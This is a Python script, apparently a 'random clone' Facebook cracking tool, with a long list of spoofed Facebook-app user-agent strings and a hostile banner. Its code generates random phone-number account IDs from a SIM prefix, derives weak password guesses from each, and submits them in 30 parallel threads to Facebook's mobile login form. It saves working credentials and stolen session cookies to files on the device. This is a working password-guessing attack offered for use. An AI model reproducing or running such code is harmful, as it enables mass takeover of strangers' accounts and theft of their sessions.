'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TATA DOCOMO;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo K50a40;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SCH-I545;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Videotron;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/eir;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_CA;FBCR/VIRGIN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/nb_NO;FBCR/N Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/SWEDEN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Tele2 SE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9506;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Tele2 SE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9005;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/zh_HK;FBCR/csl.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9005;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/fr_CA;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-N920V;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGLS990;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H811;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/fr_CA;FBCR/Koodo;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/it_IT;FBCR/I WIND;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H815;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/de_DE;FBCR/Vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/es_ES;FBCR/AR PERSONAL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/fr_CA;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N915S;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748125;FBDM/{density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]',
'[FBAN/FB4A;FBAV/62.0.0.0.39;FBBV/20569053;FBDM/{density=3.0,width=1080,height=1776};FBLC/zh_CN;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/PAAA;FBAV/50.0.0.12.305;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FB_FW/2;FBSN/Android;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-N910V;FBSV/5.0.1;]',)
#===========logo===#
logo=(f"""
\033[1;91m ╦  ╔═╗╔═╗╔═╗╔╗╔╔╦╗═╗ ╦╔═╗╦ ╦  ╦╦࿐࿐࿐
\033[1;97m ║  ║╣ ║ ╦║╣ ║║║ ║║╔╩╦╝╠═╣║ ╚╗╔╝║
\033[1;32m ╩═╝╚═╝╚═╝╚═╝╝╚╝═╩╝╩ ╚═╩ ╩╩═╝╚╝ ╩࿐࿐࿐                                                                                                                                                                       
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓࿐࿐
 ┃ \033[1;91mWELCOME \033[1;97m TO DARKNESS \033[1;32mWORLD FUCK YOUR SYSTEM ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛࿐࿐
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [+] AUTHOR : LEGENDARYACE
 ┃ [+] TOOLS.   : TRAIL
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
        
def linex():
    print(f'\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
    os.system('clear')
    print(logo)
#===========def main=====#
def Main():
	clear()
	linex()
	print(f'{G}[01] RANDOM CLONE ')
	print(f'{G}[00] EXIT TERMINAL ')
	linex()
	option=input(f'{G}[??] CHOICE>> ')
	if option in ['1','01']:
		LEGEND()
#============def LEGEND======#
def LEGEND():
    user=[]
    clear()
    print('EXAMPLE CODE : 017/016/018/019/] ')
    code=input('ENTER SIM CODE >> ')
    linex()
    print('EXAMPLE LIMIT: /1000/10000/20000/50000/ ')
    try:
        limit=int(input('ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Legend :
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'@@@###','free fire']
            Legend .submit(method_crack,ids,passlist)
    linex()
    print(' THE COMPLETE ')
    input(' PRESS ENTER TO BACK  : ')
    LEGEND()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for ps in passlist:
            sys.stdout.write('\r\r \033[1;37m[WAITING] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[OK] \033[1;32m'+ids+'\033[1;32m | \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 "CONGRATULATIONS FOR OK I D"')
                cek_apk(session,coki)
                open('/sdcard/+OK.txt', 'a').write( ids+' | '+ps+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;30m[CP] ' +ids+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BCP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
Main()

#=======end=======